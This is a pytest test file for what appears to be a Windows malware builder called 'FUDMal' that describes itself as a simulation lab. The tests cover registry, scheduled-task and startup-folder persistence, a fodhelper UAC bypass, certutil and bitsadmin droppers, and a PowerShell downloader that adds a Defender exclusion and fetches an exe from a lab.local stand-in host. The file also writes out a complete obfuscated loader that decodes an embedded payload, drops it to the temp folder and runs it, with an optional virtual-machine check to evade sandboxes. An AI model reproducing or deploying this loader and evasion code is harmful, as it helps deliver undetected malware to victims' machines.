"""Unit tests for the Logic classes and shared templates in main.py.

All tests run on Linux/CI without tkinter, winreg, Pillow, or PyInstaller.
The module is imported via importlib after stubbing out platform-specific deps,
and PyInstaller subprocess calls are patched so only the *logic* (script
generation, cipher, template formatting, etc.) is exercised.
"""

from __future__ import annotations

import ast
import base64
import contextlib
import hashlib
import sys
import tempfile
import types
import unittest.mock as mock
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# Bootstrap: import main.py with all platform-specific deps stubbed out
# ---------------------------------------------------------------------------

_MAIN_PATH = Path(__file__).parent.parent / "main.py"


def _load_main() -> types.ModuleType:
    """Load main.py once with all heavy dependencies mocked."""
    # --- tkinter ---
    tk = mock.MagicMock()
    tk.END = "end"
    tk.LEFT = "left"
    tk.Tk = mock.MagicMock
    tk.BooleanVar = mock.MagicMock
    tk.StringVar = mock.MagicMock
    for sub in ("tkinter", "tkinter.ttk", "tkinter.messagebox", "tkinter.filedialog"):
        sys.modules[sub] = tk

    # --- winreg ---
    wr = types.ModuleType("winreg")
    for attr in (
        "OpenKey",
        "CreateKey",
        "SetValueEx",
        "DeleteValue",
        "DeleteKey",
        "QueryValueEx",
        "KEY_WRITE",
        "REG_SZ",
        "HKEY_CURRENT_USER",
        "HKEY_LOCAL_MACHINE",
    ):
        setattr(wr, attr, None)
    sys.modules["winreg"] = wr

    # --- PIL ---
    pil = types.ModuleType("PIL")
    pil.Image = mock.MagicMock()  # type: ignore[attr-defined]
    sys.modules["PIL"] = pil
    sys.modules["PIL.Image"] = pil.Image  # type: ignore[attr-defined]

    import importlib.util

    spec = importlib.util.spec_from_file_location("main_module", str(_MAIN_PATH))
    assert spec is not None
    mod = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(mod)  # type: ignore[union-attr]
    return mod


# Load once for the whole test session
_main = _load_main()


# ---------------------------------------------------------------------------
# Helper: build a tiny dummy .exe file in a temp dir
# ---------------------------------------------------------------------------


@pytest.fixture
def dummy_exe(tmp_path: Path) -> Path:
    p = tmp_path / "payload.exe"
    p.write_bytes(b"\x00MZ" + b"\x00" * 60)
    return p


# ---------------------------------------------------------------------------
# IORedirector
# ---------------------------------------------------------------------------


class TestIORedirector:
    def test_write_forwards_to_widget(self) -> None:
        widget = mock.MagicMock()
        r = _main.IORedirector(widget)
        r.write("hello")
        widget.insert.assert_called_once_with(_main.tk.END, "hello")
        widget.see.assert_called_once_with(_main.tk.END)

    def test_write_survives_destroyed_widget(self) -> None:
        widget = mock.MagicMock()
        widget.insert.side_effect = Exception("widget destroyed")
        r = _main.IORedirector(widget)
        r.write("crash-proof")  # must not raise

    def test_flush_is_a_no_op(self) -> None:
        r = _main.IORedirector(mock.MagicMock())
        r.flush()  # must not raise


# ---------------------------------------------------------------------------
# VM_CHECK_CODE
# ---------------------------------------------------------------------------


class TestVmCheckCode:
    def test_is_non_empty_string(self) -> None:
        assert isinstance(_main.VM_CHECK_CODE, str)
        assert len(_main.VM_CHECK_CODE) > 0

    def test_defines_vm_function(self) -> None:
        assert "def is_running_on_vmware_windows" in _main.VM_CHECK_CODE

    def test_is_valid_python_syntax(self) -> None:
        ast.parse(_main.VM_CHECK_CODE)

    def test_checks_multiple_indicators(self) -> None:
        """Should mention VMware, VirtualBox, process list, and registry."""
        code = _main.VM_CHECK_CODE
        assert "vmware" in code.lower()
        assert "virtualbox" in code.lower()
        assert "tasklist" in code.lower()
        assert "winreg" in code.lower()


# ---------------------------------------------------------------------------
# PS_TEMPLATE
# ---------------------------------------------------------------------------


class TestPsTemplate:
    def test_format_produces_powershell_content(self) -> None:
        out = _main.PS_TEMPLATE.format(
            URL="http://lab.local/payload.exe",
            DOWNLOAD_PATH="Downloads\\",
            FILENAME="service.exe",
            DELAY_START=3,
            DELAY_WAIT=5,
        )
        assert "http://lab.local/payload.exe" in out
        assert "service.exe" in out
        assert "Start-Sleep" in out
        assert "Invoke-WebRequest" in out

    def test_format_contains_exclusion_and_start_process(self) -> None:
        out = _main.PS_TEMPLATE.format(
            URL="http://x",
            DOWNLOAD_PATH="D\\",
            FILENAME="f.exe",
            DELAY_START=0,
            DELAY_WAIT=0,
        )
        assert "Add-MpPreference" in out
        assert "Start-Process" in out


# ---------------------------------------------------------------------------
# LogicObfuscator.encode_bytes
# ---------------------------------------------------------------------------


class TestLogicObfuscatorEncodeBytes:
    def test_round_trip(self) -> None:
        original = b"Hello FUDMal!"
        key = "1.0.0"
        encoded = _main.LogicObfuscator.encode_bytes(original, key)
        # Decode using the standalone helper mirrored in test_cipher.py
        kv = [b % 64 for b in hashlib.sha256(key.encode()).digest()[:8]]
        byte_values = list(encoded)
        master_sign = -1  # decode
        for i in range(len(kv)):
            next_vals = []
            sign = (-1) ** i
            for j, cb in enumerate(byte_values):
                shift = kv[(j + i) % len(kv)] * sign * master_sign
                next_vals.append((cb + shift) % 256)
            byte_values = next_vals
        assert bytes(byte_values) == original

    def test_differs_from_input(self) -> None:
        data = b"not_identity_data"
        assert _main.LogicObfuscator.encode_bytes(data, "key") != data

    def test_deterministic(self) -> None:
        data = b"stable"
        key = "k"
        assert _main.LogicObfuscator.encode_bytes(data, key) == _main.LogicObfuscator.encode_bytes(
            data, key
        )

    def test_empty_bytes(self) -> None:
        assert _main.LogicObfuscator.encode_bytes(b"", "k") == b""

    def test_different_keys_produce_different_output(self) -> None:
        data = b"same_plaintext"
        assert _main.LogicObfuscator.encode_bytes(
            data, "key_a"
        ) != _main.LogicObfuscator.encode_bytes(data, "key_b")


# ---------------------------------------------------------------------------
# LogicSFX.create_executor  (script generation, not compilation)
# ---------------------------------------------------------------------------


class TestLogicSfxCreateExecutor:
    def _make_script(self, enable_vm: bool) -> str:
        td = tempfile.mkdtemp()
        path = _main.LogicSFX.create_executor("payload.exe", "decoy.png", td, enable_vm)
        return Path(path).read_text(encoding="utf-8")

    def test_returns_valid_python_syntax(self) -> None:
        ast.parse(self._make_script(enable_vm=False))

    def test_valid_python_with_vm_guard(self) -> None:
        ast.parse(self._make_script(enable_vm=True))

    def test_contains_payload_name(self) -> None:
        assert "payload.exe" in self._make_script(enable_vm=False)

    def test_contains_decoy_name(self) -> None:
        assert "decoy.png" in self._make_script(enable_vm=False)

    def test_vm_guard_includes_vm_function_call(self) -> None:
        src = self._make_script(enable_vm=True)
        assert "is_running_on_vmware_windows" in src

    def test_no_vm_guard_omits_vm_function_call(self) -> None:
        src = self._make_script(enable_vm=False)
        assert "is_running_on_vmware_windows" not in src

    def test_contains_detached_process_launch(self) -> None:
        assert "DETACHED_PROCESS" in self._make_script(enable_vm=False)


# ---------------------------------------------------------------------------
# Helpers shared by all "generated script" tests below
# ---------------------------------------------------------------------------


def _capture_generated_script(
    cls_name: str,
    kwargs: dict,
) -> str:
    """Call Logic.build() with subprocess.run mocked and capture the written .py."""
    cls = getattr(_main, cls_name)
    captured: list[str] = []
    orig_open = open

    class _CapturingFile:
        def __init__(self, path: str, mode: str = "r", **kw):
            self._f = orig_open(path, mode, **kw)
            self._path = path

        def write(self, s: str) -> int:
            if self._path.endswith(".py"):
                captured.append(s)
            return self._f.write(s)

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return self._f.__exit__(*a)

    with (
        mock.patch("subprocess.run"),
        mock.patch("shutil.move"),
        mock.patch(
            "builtins.open",
            side_effect=lambda p, m="r", **kw: (
                _CapturingFile(p, m, **kw) if "w" in str(m) else orig_open(p, m, **kw)
            ),
        ),
        contextlib.suppress(Exception),
    ):
        cls.build(**kwargs)

    assert captured, f"No .py script was captured for {cls_name}"
    return captured[0]


# ---------------------------------------------------------------------------
# LogicRegistryPersistence – generated script
# ---------------------------------------------------------------------------


class TestLogicRegistryPersistence:
    @pytest.fixture(autouse=True)
    def _exe(self, dummy_exe: Path, tmp_path: Path):
        self._payload = dummy_exe
        self._out_dir = tmp_path

    def _script(self, enable_vm: bool = False, enable_cleanup: bool = True) -> str:
        return _capture_generated_script(
            "LogicRegistryPersistence",
            {
                "payload_path": str(self._payload),
                "key_name": "TestKey",
                "output_name": "RegSim.exe",
                "output_dir": str(self._out_dir),
                "enable_vm": enable_vm,
                "enable_cleanup": enable_cleanup,
                "log_widget": mock.MagicMock(),
            },
        )

    def test_valid_python_no_vm_with_cleanup(self) -> None:
        ast.parse(self._script(enable_vm=False, enable_cleanup=True))

    def test_valid_python_with_vm_no_cleanup(self) -> None:
        ast.parse(self._script(enable_vm=True, enable_cleanup=False))

    def test_valid_python_with_vm_and_cleanup(self) -> None:
        ast.parse(self._script(enable_vm=True, enable_cleanup=True))

    def test_contains_run_key_path(self) -> None:
        src = self._script()
        # The registry path is emitted as a raw-string literal with single
        # backslashes (e.g. r"...\CurrentVersion\Run"), so just verify the
        # key path components are present in the generated source.
        assert "CurrentVersion" in src
        assert "Run" in src

    def test_cleanup_code_present_when_enabled(self) -> None:
        assert "DeleteValue" in self._script(enable_cleanup=True)

    def test_cleanup_code_absent_when_disabled(self) -> None:
        assert "DeleteValue" not in self._script(enable_cleanup=False)

    def test_vm_guard_present_when_enabled(self) -> None:
        assert "is_running_on_vmware_windows" in self._script(enable_vm=True)

    def test_vm_guard_absent_when_disabled(self) -> None:
        assert "is_running_on_vmware_windows" not in self._script(enable_vm=False)

    def test_technique_label_in_script(self) -> None:
        assert "T1547.001" in self._script()

    def test_simlab_staging_dir(self) -> None:
        assert "SimLab" in self._script()


# ---------------------------------------------------------------------------
# LogicScheduledTask – generated script
# ---------------------------------------------------------------------------


class TestLogicScheduledTask:
    @pytest.fixture(autouse=True)
    def _exe(self, dummy_exe: Path, tmp_path: Path):
        self._payload = dummy_exe
        self._out_dir = tmp_path

    def _script(
        self, trigger: str = "ONLOGON", enable_vm: bool = False, enable_cleanup: bool = True
    ) -> str:
        return _capture_generated_script(
            "LogicScheduledTask",
            {
                "payload_path": str(self._payload),
                "task_name": "SimTask",
                "trigger": trigger,
                "output_name": "SchedSim.exe",
                "output_dir": str(self._out_dir),
                "enable_vm": enable_vm,
                "enable_cleanup": enable_cleanup,
                "log_widget": mock.MagicMock(),
            },
        )

    def test_valid_python_onlogon_no_cleanup(self) -> None:
        ast.parse(self._script("ONLOGON", enable_cleanup=False))

    def test_valid_python_daily_with_cleanup(self) -> None:
        ast.parse(self._script("DAILY", enable_cleanup=True))

    def test_valid_python_with_vm_guard(self) -> None:
        ast.parse(self._script(enable_vm=True))

    def test_onlogon_trigger_in_script(self) -> None:
        assert "ONLOGON" in self._script("ONLOGON")

    def test_daily_trigger_in_script(self) -> None:
        assert "DAILY" in self._script("DAILY")

    def test_task_name_in_script(self) -> None:
        assert "SimTask" in self._script()

    def test_schtasks_command_present(self) -> None:
        assert "schtasks" in self._script()

    def test_cleanup_present_when_enabled(self) -> None:
        assert "/Delete" in self._script(enable_cleanup=True)

    def test_cleanup_absent_when_disabled(self) -> None:
        assert "/Delete" not in self._script(enable_cleanup=False)

    def test_technique_label_in_script(self) -> None:
        assert "T1053.005" in self._script()


# ---------------------------------------------------------------------------
# LogicStartupFolder – generated script
# ---------------------------------------------------------------------------


class TestLogicStartupFolder:
    @pytest.fixture(autouse=True)
    def _exe(self, dummy_exe: Path, tmp_path: Path):
        self._payload = dummy_exe
        self._out_dir = tmp_path

    def _script(self, enable_vm: bool = False, enable_cleanup: bool = True) -> str:
        return _capture_generated_script(
            "LogicStartupFolder",
            {
                "payload_path": str(self._payload),
                "output_name": "StartupSim.exe",
                "output_dir": str(self._out_dir),
                "enable_vm": enable_vm,
                "enable_cleanup": enable_cleanup,
                "log_widget": mock.MagicMock(),
            },
        )

    def test_valid_python_no_vm_with_cleanup(self) -> None:
        ast.parse(self._script())

    def test_valid_python_with_vm_no_cleanup(self) -> None:
        ast.parse(self._script(enable_vm=True, enable_cleanup=False))

    def test_startup_folder_path_in_script(self) -> None:
        src = self._script()
        assert "Start Menu" in src or "Startup" in src

    def test_cleanup_code_present_when_enabled(self) -> None:
        assert "os.remove" in self._script(enable_cleanup=True)

    def test_cleanup_code_absent_when_disabled(self) -> None:
        assert "os.remove" not in self._script(enable_cleanup=False)

    def test_technique_label_in_script(self) -> None:
        assert "T1547.001" in self._script()


# ---------------------------------------------------------------------------
# LogicUACBypass – generated script
# ---------------------------------------------------------------------------


class TestLogicUACBypass:
    @pytest.fixture(autouse=True)
    def _exe(self, dummy_exe: Path, tmp_path: Path):
        self._payload = dummy_exe
        self._out_dir = tmp_path

    def _script(self, enable_vm: bool = False, enable_cleanup: bool = True) -> str:
        return _capture_generated_script(
            "LogicUACBypass",
            {
                "payload_path": str(self._payload),
                "output_name": "UACBypassSim.exe",
                "output_dir": str(self._out_dir),
                "enable_vm": enable_vm,
                "enable_cleanup": enable_cleanup,
                "log_widget": mock.MagicMock(),
            },
        )

    def test_valid_python_no_vm_with_cleanup(self) -> None:
        ast.parse(self._script())

    def test_valid_python_with_vm_no_cleanup(self) -> None:
        ast.parse(self._script(enable_vm=True, enable_cleanup=False))

    def test_valid_python_with_vm_and_cleanup(self) -> None:
        ast.parse(self._script(enable_vm=True, enable_cleanup=True))

    def test_fodhelper_path_in_script(self) -> None:
        assert "fodhelper" in self._script()

    def test_ms_settings_key_in_script(self) -> None:
        assert "ms-settings" in self._script()

    def test_delegate_execute_key_in_script(self) -> None:
        assert "DelegateExecute" in self._script()

    def test_cleanup_code_present_when_enabled(self) -> None:
        assert "DeleteKey" in self._script(enable_cleanup=True)

    def test_cleanup_code_absent_when_disabled(self) -> None:
        assert "DeleteKey" not in self._script(enable_cleanup=False)

    def test_vm_guard_present_when_enabled(self) -> None:
        assert "is_running_on_vmware_windows" in self._script(enable_vm=True)

    def test_vm_guard_absent_when_disabled(self) -> None:
        assert "is_running_on_vmware_windows" not in self._script(enable_vm=False)

    def test_technique_label_in_script(self) -> None:
        assert "T1548.002" in self._script()

    def test_simulation_note_not_executing(self) -> None:
        """Must state that actual execution is skipped."""
        assert "simulation" in self._script().lower()

    def test_simlab_staging_dir(self) -> None:
        assert "SimLab" in self._script()


# ---------------------------------------------------------------------------
# LogicCmdDropper – generated script
# ---------------------------------------------------------------------------


class TestLogicCmdDropper:
    @pytest.fixture(autouse=True)
    def _setup(self, tmp_path: Path):
        self._out_dir = tmp_path

    def _script(self, enable_vm: bool = False) -> str:
        return _capture_generated_script(
            "LogicCmdDropper",
            {
                "url": "http://lab.local/payload.exe",
                "download_path": "Downloads\\",
                "filename": "update.exe",
                "delay_start": 3,
                "output_name": "CmdDropperSim.exe",
                "output_dir": str(self._out_dir),
                "enable_vm": enable_vm,
                "log_widget": mock.MagicMock(),
            },
        )

    def test_valid_python_without_vm(self) -> None:
        ast.parse(self._script(enable_vm=False))

    def test_valid_python_with_vm(self) -> None:
        ast.parse(self._script(enable_vm=True))

    def test_certutil_command_present(self) -> None:
        assert "certutil" in self._script()

    def test_bitsadmin_command_present(self) -> None:
        assert "bitsadmin" in self._script()

    def test_url_embedded_in_script(self) -> None:
        assert "http://lab.local/payload.exe" in self._script()

    def test_filename_embedded_in_script(self) -> None:
        assert "update.exe" in self._script()

    def test_delay_embedded_in_script(self) -> None:
        assert "3" in self._script()

    def test_vm_guard_present_when_enabled(self) -> None:
        assert "is_running_on_vmware_windows" in self._script(enable_vm=True)

    def test_vm_guard_absent_when_disabled(self) -> None:
        assert "is_running_on_vmware_windows" not in self._script(enable_vm=False)

    def test_technique_label_in_script(self) -> None:
        assert "T1059.003" in self._script()

    def test_simulation_note_not_executing(self) -> None:
        """Must state that actual commands were not executed."""
        assert "not actually executed" in self._script() or "simulation" in self._script().lower()


# ---------------------------------------------------------------------------
# LogicConfigGen – full_script generation (no PyInstaller)
# ---------------------------------------------------------------------------


class TestLogicConfigGenScript:
    """Test the full_script string assembled inside LogicConfigGen.generate."""

    def _assemble(self, enable_vm: bool = False) -> str:
        """Reconstruct full_script without running PyInstaller."""
        import textwrap as tw

        ps_content = _main.PS_TEMPLATE.format(
            URL="http://lab.local/p.exe",
            DOWNLOAD_PATH="Downloads\\",
            FILENAME="p.exe",
            DELAY_START=3,
            DELAY_WAIT=5,
        )
        # Pre-compute to avoid backslash-in-f-string (not valid in Python 3.10)
        escaped_ps = ps_content.replace("'", "\\'")

        if enable_vm:
            core_logic = tw.dedent("""\
if is_running_on_vmware_windows():
    sys.exit(0)
else:
    execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
""")
        else:
            core_logic = "execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)\n"

        full_script = tw.dedent(f"""
{_main.VM_CHECK_CODE}
{_main.PS_EXEC_FUNCTION}

# --- TEMPLATE VARIABLES ---
PS_SCRIPT_CONTENT = '''{escaped_ps}'''
EXECUTION_DELAY = 3

if __name__ == "__main__":
    if platform.system() == "Windows":
{tw.indent(core_logic, "        ")}
    else:
        sys.exit(0)
""")
        return full_script

    def test_valid_python_without_vm(self) -> None:
        ast.parse(self._assemble(enable_vm=False))

    def test_valid_python_with_vm(self) -> None:
        ast.parse(self._assemble(enable_vm=True))

    def test_contains_url(self) -> None:
        assert "http://lab.local/p.exe" in self._assemble()

    def test_contains_invoke_webrequest(self) -> None:
        assert "Invoke-WebRequest" in self._assemble()

    def test_vm_guard_present_when_enabled(self) -> None:
        # When VM guard is on the function is both defined AND called.
        assert "is_running_on_vmware_windows" in self._assemble(enable_vm=True)

    def test_vm_guard_call_absent_when_disabled(self) -> None:
        # VM_CHECK_CODE (defines the function) is always embedded so it can be
        # imported if needed; only the *call* is conditional.  When disabled,
        # 'sys.exit(0)' from the guard branch must be absent from core_logic.
        script = self._assemble(enable_vm=False)
        # The function definition is present (VM_CHECK_CODE is always included)
        assert "def is_running_on_vmware_windows" in script
        # But the conditional call / sys.exit branch is NOT present
        assert "if is_running_on_vmware_windows():" not in script

    def test_execute_powershell_function_included(self) -> None:
        assert "execute_powershell_script" in self._assemble()


# ---------------------------------------------------------------------------
# LogicObfuscator – loader script generation
# ---------------------------------------------------------------------------


class TestLogicObfuscatorLoaderScript:
    """Test that the loader script embedded in LogicObfuscator.build is syntactically valid."""

    def _loader(self, enable_vm: bool = False) -> str:
        data = b"some_payload_bytes"
        key = "v1.0"
        enc_data = _main.LogicObfuscator.encode_bytes(data, key)
        b64_payload = base64.b64encode(enc_data).decode("utf-8")

        vm_code = _main.VM_CHECK_CODE if enable_vm else ""
        vm_call = "    if is_running_on_vmware_windows(): return" if enable_vm else ""

        import textwrap as tw

        return tw.dedent(f"""
import os, sys, subprocess, tempfile, hashlib, base64, platform, winreg
{vm_code}

def generate_key_values(version_key):
    hash_object = hashlib.sha256(version_key.encode('utf-8'))
    hash_bytes = hash_object.digest()
    return [b % 64 for b in hash_bytes[:8]]

def _process_bytes(data: bytes, processing_values: list, mode: str) -> bytes:
    byte_values = list(data)
    pipe = len(processing_values)
    master_sign = 1 if mode == 'encode' else -1
    for i in range(pipe):
        next_vals = []
        internal_sign = (-1) ** i
        for j in range(len(byte_values)):
            curr = byte_values[j]
            k_idx = (j + i) % pipe
            shift = processing_values[k_idx] * internal_sign * master_sign
            next_vals.append((curr + shift) % 256)
        byte_values = next_vals
    return bytes(byte_values)

def decode_bytes(data, key):
    kv = generate_key_values(key)
    return _process_bytes(data, kv, 'decode')

KEY = "{key}"
PAYLOAD = "{b64_payload}"

def run():
{vm_call}
    try:
        enc = base64.b64decode(PAYLOAD)
        orig = decode_bytes(enc, KEY)
        temp_dir = tempfile.gettempdir()
        t_path = os.path.join(temp_dir, 'run_' + str(os.getpid()) + '.exe')
        with open(t_path, 'wb') as f: f.write(orig)
        subprocess.run([t_path] + sys.argv[1:])
        try: os.remove(t_path)
        except: pass
    except: pass

if __name__ == "__main__":
    run()
""")

    def test_valid_python_without_vm(self) -> None:
        ast.parse(self._loader(enable_vm=False))

    def test_valid_python_with_vm(self) -> None:
        ast.parse(self._loader(enable_vm=True))

    def test_payload_base64_present(self) -> None:
        assert "PAYLOAD" in self._loader()

    def test_decode_function_present(self) -> None:
        assert "decode_bytes" in self._loader()

    def test_vm_guard_present_when_enabled(self) -> None:
        assert "is_running_on_vmware_windows" in self._loader(enable_vm=True)
